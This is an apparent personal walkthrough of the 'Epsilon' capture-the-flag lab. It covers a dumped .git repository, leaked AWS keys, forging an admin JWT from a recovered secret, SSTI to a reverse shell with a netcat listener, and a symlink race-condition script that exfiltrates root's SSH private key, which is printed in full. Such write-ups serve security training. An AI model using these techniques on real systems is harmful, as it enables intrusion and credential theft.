## Epsilon

### Lab Details 

- Difficulty: Medium
- Type: Web App, Session Hijacking, AWS Lamda, SSTI, Symlink, Priv Esc, Linux

#### Enumeration
- run nmap
- shows 3 ports: 80, 5000 and 22
- on port 80 hosts `/.git` from the output of nmap scan
```
80/tcp   open  http    Apache httpd 2.4.41
| http-git: 
|   10.129.96.151:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
- we can attempt to download `/.git` directory with `git-dumper`
- after downloading the directory, checking the logs 
```
$ git log
commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -> master)
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module
```
- found `aws` secret key
```bash
$ git show 7cf92a7a09e523c1c667d13847c9ba22464412f3
commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
new file mode 100644
index 0000000..fed7ab9
--- /dev/null
+++ b/track_api_CR_148.py
@@ -0,0 +1,36 @@
+import io
+import os
+from zipfile import ZipFile
+from boto3.session import Session
+
+
+session = Session(
+    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    region_name='us-east-1',
+    endpoint_url='http://cloud.epsilong.htb')
+aws_lambda = session.client('lambda')
```
- we can download `aws cli` to interact with the  `aws` endpoint
```
$ aws configure
AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [None]: us-east-1
Default output format [None]:
```
- getting info on `aws lambda` functions
```
$ aws --endpoint-url=http://cloud.epsilon.htb lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2025-09-03T13:39:24.383+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "abb604eb-fe83-406d-8015-aceeac3fec3c",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```
- getting info on `lambda function costume_shop_v1 ` 
```
$ aws --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-name=costume_shop_v1 
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2025-09-03T13:39:24.383+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "abb604eb-fe83-406d-8015-aceeac3fec3c",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}
```
- visit `http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code` to view the function
```
$ cat lambda_function.py 
import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
```
#### Initial Foothold 
- based on `server.py` from `./git`
```bash
@app.route("/", methods=["GET","POST"])
def index():
	if request.method=="POST":
		if request.form['username']=="admin" and request.form['password']=="admin":
			res = make_response()
			username=request.form['username']
			token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
			res.set_cookie("auth",token)
			res.headers['location']='/home'
			return res,302
		else:
			return render_template('index.html')
	else:
		return render_template('index.html')
```
- we can engineer the token by encrypting the secret with username and algorithm using the`JWT` library 
```bash
$ python3             
Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> jwt.encode({"username":"admin"},'RrXCv`mrNe!K!4+5`wYq',algorithm='HS256\
')
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'
```
- unable to access to admin dash on port 80 on firefox changed to chrome worked
![[session hijacking.png]]
- from `server.py` shows that `/order` endpoint has a function called `order()` which shows the message `Your order of "{}" has been placed successfully.` that message is been displayed using server side template
- we can attempt to perform `SSTI` against the `costume` field in `/order` endpoint
 ```bash
@app.route('/order',methods=["GET","POST"])
def order():
	if verify_jwt(request.cookies.get('auth'),secret):
		if request.method=="POST":
			costume=request.form["costume"]
			message = '''
			Your order of "{}" has been placed successfully.
			'''.format(costume)
			tmpl=render_template_string(message,costume=costume)
			return render_template('order.html',message=tmpl)
		else:
			return render_template('order.html')
	else:
		return redirect('/',code=302)
app.run(debug='true')
```
- testing `SSTI` with basic payload `{{ 7 * 7 }}`
![[Medium/Unix/Epsilon/SSTI test.png]]
- injecting a RCE using `SSTI`
![[SSTI RCE.png]]
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.35] from (UNKNOWN) [10.129.96.151] 57276
bash: cannot set terminal process group (1053): Inappropriate ioctl for device
bash: no job control in this shell
tom@epsilon:/var/www/app$ whoami
whoami
tom
```
#### Lateral Movement (If any)

#### Privilege Escalation
- load and execute `linpeas.sh`
- found interesting shell files
```bash
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/local/bin/aws_zsh_completer.sh
/usr/bin/backup.sh
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh
```
- checking out `/usr/bin/backup.sh`
- since anyone is able to write to `/opt/backups` the script is vulnerable to  Symlink Attack via Race Condition
```bash
tom@epsilon:/var/www/app$ cat /usr/bin/backup.sh
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
##
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*

tom@epsilon:/var/www/app$ ls -la /opt/backups
total 8
drwxr-xrwx 2 root root 4096 Sep  3 17:10 .
```
- the 5-second sleep (sleep 5) creates a time window where the files in /opt/backups/ are just sitting there, waiting to be packed into the final archive.
- since we have write permissions to the `/opt/backups/ `directory, we can delete the original `$file.tar` and replace it with a symbolic link pointing to a sensitive file we want to read 
- example of exploit script
```bash
#!/bin/sh
if [ -e /opt/backups/checksum ]; then
rm -f /opt/backups/checksum
 echo '[+] Checksum file removed'
 ln -sf /root/.ssh/id_rsa /opt/backups/checksum
 echo '[+] Symlink placed'
fi
```
- running with `while` loop to increase the success rate of winning the race condition
```bash
tom@epsilon:~$ while true; do ./exploit1.sh; done
while true; do ./exploit1.sh; done
[+] Checksum file removed
[+] Symlink placed
```
- de-archive the tar file to get `root` user's private key
```bash
tom@epsilon:/var/backups/web_backups$ cp 117269337.tar ~/
tom@epsilon:~$ tar -xf 117269337.tar
tom@epsilon:~$ cat ./opt/backups/checksum
cat ./opt/backups/checksum
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
- `ssh` into target as `root` using the private key
```bash
$ ssh root@10.129.96.151 -i ./key 
```
#### Resources

#### Lesson Learned
- Configure and interacting with `AWS lambda functions`